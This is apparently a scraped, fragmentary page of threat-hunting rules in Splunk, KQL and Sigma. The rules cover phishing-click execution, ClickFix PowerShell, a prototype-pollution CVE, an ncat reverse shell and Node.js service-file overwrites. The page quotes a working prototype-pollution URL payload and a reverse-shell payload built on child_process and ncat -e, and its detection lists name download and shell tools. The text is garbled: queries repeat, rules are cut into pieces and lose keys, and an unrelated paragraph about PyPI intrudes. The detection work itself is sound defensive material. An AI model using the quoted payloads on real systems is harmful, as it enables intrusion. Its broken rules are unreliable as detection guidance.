                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

   or ParentProcessName endswith "\RuntimeBroker.exe"

   or NewProcessName endswith "\pwsh.exe"
   or NewProcessName endswith "\mshta.exe"

          NewProcessName, CommandLine
| order by TimeGenerated desc

title: FakeCaptcha / ClickFix - Clipboard-Injected PowerShell from Explorer
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d06
status: experimental
description: |
    "FakeCaptcha" / "ClickFix" social-engineering: malicious site asks
    user to press Win+R and paste a payload. The result is
    powershell/mshta launched directly from explorer.exe with iex /
    base64 / downloadstring in the command line.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1204/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1204.002
    - attack.execution

    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\explorer.exe'
            - '\RuntimeBroker.exe'

        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\mshta.exe'

        CommandLine|contains:
            - 'iex'
            - 'invoke-expression'
            - 'frombase64'
            - 'downloadstring'
            - 'hxxp'
            - 'curl '
            - 'wget '
    condition: selection_parent and selection_child and selection_cmd

    - IT-driven scripted automation that admins paste-launch

In this post, we’ll discuss why developers include native C/C++ extensions in their high-level language projects. Then, we’ll use Python and the PyPI registry to detect hidden C-related vulnerabilities in higher-level language projects and reveal how low-level vulnerabilities can impact higher-level code.

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).

Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2003-1564")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2003-1564")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

Prototype pollution attempt via __proto__ in URL query string (CVE-2021-23682, litespeed.js/appwrite) AIExploitation Medium
Hunts inbound HTTP requests whose query string carries a prototype-pollution payload such as __proto__[polluted]=yes or constructor[prototype][...] — the exact exploitation pattern for the litespeed.js getJsonFromUrl flaw (CVE-2021-23682) bundled in appwrite/server-ce. Targets internet-facing web/proxy/WAF logs, with attention to the /auth/signup endpoint named in the report. Rationale: Anchored on the verbatim exploit string from the article (mywebsite.com/auth/signup?__proto__[polluted]=yes) plus the URL-encoded form and the constructor[prototype] alternate gadget; __proto__[ in a query string is near-zero in benign traffic, making it high-fidelity. defender_kql/falcon/datadog/cloudwatch left empty because this is an inbound web-access-log signal with no Defender XDR, Falcon FDR, in-scope Datadog, or CloudTrail equivalent — for App Service deployments swap W3CIISLog for AppServiceHTTPLogs (CsUriQuery) and for WAF/proxy use CommonSecurityLog (RequestURL). Cross-checked the GitHub Advisory and Snyk vuln DB confirming CVE-2021-23682, vulnerable getJsonFromUrl, fixed in litespeed.js 0.3.12 / appwrite-server-ce 0.12.2 & 0.11.1. Cross-checked against: • https://github.com/advisories/GHSA-v9p9-535w-4285 • https://nvd.nist.gov/vuln/detail/CVE-2021-23682 • https://security.snyk.io/vuln/SNYK-JS-LITESPEEDJS-2359250
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized DAST/web vulnerability scanners (Burp Suite, OWASP ZAP, Nuclei) firing prototype-pollution test payloads during a pentest or CI security gate
  • Bug-bounty researchers probing /auth/signup and other endpoints from external IPs
  • Internal security team validation testing after deploying the litespeed.js/appwrite patch
  • A legitimate application parameter literally named or containing '__proto__' (rare, but possible in poorly-designed APIs)
  • Generic web crawlers / fuzzers replaying known exploit payloads from public PoC lists
Suppression filter
| where not(csUserAgent has_any ("Nuclei","OWASP ZAP","Burp","sqlmap","Nessus","Qualys")) and not(ipv4_is_in_any_range(cIP, "10.0.0.0/8"))   // drop known scanner UAs and internal vuln-scan source ranges
Response runbook
1) Triage: Pull the source IP (cIP/Web.src) and user-agent; confirm whether the request hit /auth/signup or another endpoint and what HTTP status was returned (200/302 = the request was processed). Check if the IP is a known internal scanner. 2) Contain: If unsanctioned, block the source IP at the WAF/reverse proxy and verify the affected app is patched — litespeed.js >= 0.3.12 and appwrite/server-ce >= 0.12.2 (or 0.11.1); if not, prioritize patching/virtual-patching the prototype-pollution sink. 3) Hunt: Search the same source IP for other gadget variants (constructor[prototype], __proto__ on different paths), follow-on stored/reflected XSS, and any anomalous authenticated session activity that could indicate successful client-side pollution leading to account takeover.
// Inbound prototype-pollution payload in URL query string (CVE-2021-23682)
// Primary: IIS reverse proxy / web server logs. See rationale for App Service / WAF variants.
let lookback = 14d;
W3CIISLog
| where TimeGenerated > ago(lookback)
| where csUriQuery has_any ("__proto__", "constructor[prototype]", "constructor%5Bprototype%5D", "__proto__%5B")
| extend IsSignupEndpoint = csUriStem has "/auth/signup"   // endpoint called out in the report
| project TimeGenerated, Computer, sSiteName, cIP, csMethod, csUriStem, csUriQuery, scStatus, csUserAgent, IsSignupEndpoint
| order by TimeGenerated desc
title: Prototype Pollution Payload in HTTP Query String (CVE-2021-23682)
id: 6f3b1d2a-9c4e-4a77-bb2e-1f0a5c8d4e21
description: Detects inbound HTTP requests carrying a JavaScript prototype-pollution payload (__proto__ / constructor[prototype]) in the URL query string, matching exploitation of the litespeed.js getJsonFromUrl flaw bundled in appwrite/server-ce.
references:
  - https://snyk.io/blog/modernizing-sast-rules-maintenance-catch-vulnerabilities-faster/

| sort - lastTime
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Web.Web where (Web.uri_query="*__proto__*" OR Web.uri_query="*constructor[prototype]*" OR Web.uri_query="*constructor%5Bprototype%5D*" OR Web.url="*__proto__[*" OR Web.url="*__proto__%5B*") by Web.src, Web.dest, Web.site, Web.http_user_agent, Web.uri_path, Web.uri_query, Web.status, Web.http_method
| `drop_dm_object_name(Web)`
| eval is_signup=if(like(uri_path,"%/auth/signup%"),1,0)
| convert ctime(firstTime) ctime(lastTime)
| sort - lastTime

Actions on Objectives
—
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"

                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")

     | rename dest AS src]

Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) Exploitation High
Browser-pasted PowerShell launched from explorer/Run dialog — ClickFix social engineering.
ATT&CKT1204.004 T1059.001
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("explorer.exe","RuntimeBroker.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","mshta.exe")
| where ProcessCommandLine matches regex @"(?i)(iex|invoke-expression|frombase64|downloadstring|hxxp|curl |wget )"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName endswith "\explorer.exe"
   or ParentProcessName endswith "\RuntimeBroker.exe"
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\pwsh.exe"
   or NewProcessName endswith "\mshta.exe"
| where CommandLine matches regex @"(?i)(iex|invoke-expression|frombase64|downloadstring|hxxp|curl |wget )"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: FakeCaptcha / ClickFix - Clipboard-Injected PowerShell from Explorer
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d06
status: experimental
description: |
    "FakeCaptcha" / "ClickFix" social-engineering: malicious site asks
    user to press Win+R and paste a payload. The result is
    powershell/mshta launched directly from explorer.exe with iex /
    base64 / downloadstring in the command line.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1204/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1204.002
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\explorer.exe'
            - '\RuntimeBroker.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\mshta.exe'
    selection_cmd:
        CommandLine|contains:
            - 'iex'
            - 'invoke-expression'
            - 'frombase64'
            - 'downloadstring'
            - 'hxxp'
            - 'curl '
            - 'wget '
    condition: selection_parent and selection_child and selection_cmd
falsepositives:
    - IT-driven scripted automation that admins paste-launch
level: high

Actions on Objectives

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Node.js web process overwriting application .js service file (GraphQL path-traversal file write) · Article-specific behavioural hunt — Improving GraphQL security with static analysis and Snyk Code
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.

Reverse shell via ncat -e spawned by Node.js app (SonicJS GraphQL path-traversal RCE) AICommand & Control High
Hunts the exact post-exploitation payload from the article — a Linux web-app process launching netcat/ncat with the `-e` flag bound to /bin/bash (or /bin/sh), e.g. `ncat 127.0.0.1 4445 -e /bin/bash`. This is the reverse shell the article shows being planted into a SonicJS service file via the vulnerable GraphQL fileUpdate mutation and executed on app startup. Rationale: Anchored on the article's literal RCE payload `require("child_process").exec('ncat 127.0.0.1 4445 -e /bin/bash')`. The netcat `-e`/shell-redirect combination is almost never legitimate, making it high-fidelity; the destination IP (127.0.0.1:4445) is an illustrative demo value so the behaviour, not the IOC, is the durable signal. No external corroboration sought (educational SAST article, no live campaign/IOCs).
ATT&CKT1059.004 T1571
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Sanctioned penetration-test or red-team exercise using nc/ncat -e for shell testing
  • Legacy admin troubleshooting scripts piping a shell over netcat for connectivity tests
  • Security-tool egress/connectivity checkers that wrap a shell
  • CTF or training lab hosts where reverse shells are expected
Suppression filter
| where not (InitiatingProcessFileName in~ ("nmap","nessus") or ProcessCommandLine has "--scan")
Response runbook
1) Triage: pull the full process tree for the ncat PID — confirm the parent chain (web app like node → /bin/sh -c → ncat) and capture the destination IP/port from ProcessCommandLine; check if the host runs a public-facing Node/GraphQL service. 2) Contain: isolate the host, kill the ncat process and its parent shell, and block the destination IP/port at the egress firewall. 3) Hunt: review recent writes to the app's service .js files by the web-server user (see companion file-overwrite UC), inspect the web/WAF logs for `fileUpdate` GraphQL mutations containing `../` traversal, and sweep other hosts for the same ncat -e pattern.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("ncat","nc","netcat")
| where ProcessCommandLine has "-e" and ProcessCommandLine has_any ("/bin/bash","/bin/sh","/bin/dash")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
Syslog
| where TimeGenerated > ago(7d)
| where SyslogMessage has_any ("ncat","netcat") or SyslogMessage matches regex @"(^|\s|/)nc(\s|$)"
| where SyslogMessage has "-e" and (SyslogMessage has "/bin/bash" or SyslogMessage has "/bin/sh" or SyslogMessage has "/bin/dash")
| project TimeGenerated, Computer, Facility, ProcessName, SyslogMessage
| order by TimeGenerated desc
title: Reverse Shell via ncat -e on Linux (SonicJS GraphQL RCE payload)
id: 8c1d9a44-2f7e-4b3a-9a21-6f0e2b7c4d11
status: experimental
description: Detects a netcat/ncat invocation with the -e flag bound to a shell, matching the reverse-shell payload described in the Snyk GraphQL/SonicJS article.
references:
  - https://snyk.io/blog/graphql-security-static-analysis-snyk-code/
author: SOC Detection Engineering

Node.js web process overwriting application .js service file (GraphQL path-traversal file write) AIExploitation Medium
Hunts the install step of the article's SonicJS exploit chain — the vulnerable fileUpdate mutation calls fs.writeFile on attacker-controlled paths, letting an attacker overwrite a startup-loaded service .js file (e.g. server/services/file.service.js) with a child_process backdoor. Flags a node process modifying/creating .js files inside the application's services directory at runtime, which legitimate running apps do not do. Rationale: Anchored on the article's exploit mechanism: writeFile(args.filePath, args.fileContent) over a path-traversal value to overwrite a startup-loaded SonicJS service .js (server/services/file.service.js) with the child_process backdoor. A running node app self-modifying its own service .js is abnormal; build/deploy noise is filtered out, leaving it hunting-grade. Datadog/CloudWatch left empty — the provided linux.auditd schema exposes no target-filename field and this is not AWS telemetry.
ATT&CKT1190 T1554
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • npm install / npm ci writing .js into module or services paths
  • Build tools (webpack, babel, tsc, rollup) emitting compiled .js at runtime
  • CI/CD or container-deploy pipelines rewriting application files in place
  • nodemon / hot-reload dev workflows regenerating service files
  • Auto-update mechanisms patching application code
Suppression filter
| where FolderPath !has "/node_modules/" | where InitiatingProcessCommandLine !has_any ("npm","yarn","webpack","babel","tsc","rollup","nodemon","install","ci")
Response runbook
1) Triage: open the modified service .js (or its SHA256/new content) and check for child_process, exec, spawn, or ncat/nc reverse-shell strings; confirm no concurrent deploy/CI job touched the host. 2) Contain: if malicious code is present, isolate the host, restore the original file from a known-good build artifact, and restart the service from clean code. 3) Hunt: review web/WAF logs for `fileUpdate` GraphQL mutations with `../` traversal sequences, check for the ncat -e reverse-shell process (companion UC), and confirm GraphQL introspection/auth controls on the affected endpoint.
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node","nodejs")
| where ActionType in ("FileCreated","FileModified")
| where FileName endswith ".js"
| where FolderPath has "/services/"
| where FolderPath !has "/node_modules/"
| where not(InitiatingProcessCommandLine has_any ("npm","yarn","webpack","babel","tsc","rollup","nodemon","install"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("node","nodejs")
| where EventType in ("FileCreated","FileModified")
| where TargetFileName endswith ".js"
| where TargetFilePath has "/services/"
| where TargetFilePath !has "/node_modules/"
| where not(ActingProcessCommandLine has_any ("npm","yarn","webpack","babel","tsc","rollup","nodemon","install"))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc
title: Node.js Process Overwriting Application Service .js File (GraphQL Path-Traversal Write)
id: a4f7e210-9b3c-4d6e-8a15-2c7f0e1b9d33
status: experimental
description: Detects a node process creating or modifying a .js file inside an application services directory at runtime, matching the SonicJS GraphQL fileUpdate path-traversal overwrite described by Snyk.
references:
  - https://snyk.io/blog/graphql-security-static-analysis-snyk-code/
author: SOC Detection Engineering
date: 2026/06/29
tags:
  - attack.initial_access
  - attack.t1190
  - attack.t1554
logsource:
  category: file_event
  product: linux
detection:
  selection:
    Image|contains: 'node'
    TargetFilename|endswith: '.js'
    TargetFilename|contains: '/services/'
  filter_buildtools:
    TargetFilename|contains: '/node_modules/'
  condition: selection and not filter_buildtools
falsepositives:
  - Build tooling or CI/CD deployment writing application code
  - Hot-reload dev servers (nodemon)
level: medium
#event_simpleName=FileWritten TargetFileName=/\/services\/.*\.js$/i
| ContextImageFileName=/\/node(js)?$/i
| NOT (TargetFileName=/\/node_modules\//i)
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where (Filesystem.action="created" OR Filesystem.action="modified") Filesystem.file_name="*.js" Filesystem.file_path="*/services/*" by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.process_id | `drop_dm_object_name(Filesystem)` | where NOT match(file_path,"node_modules") | convert ctime(firstTime) ctime(lastTime) | sort - lastTime
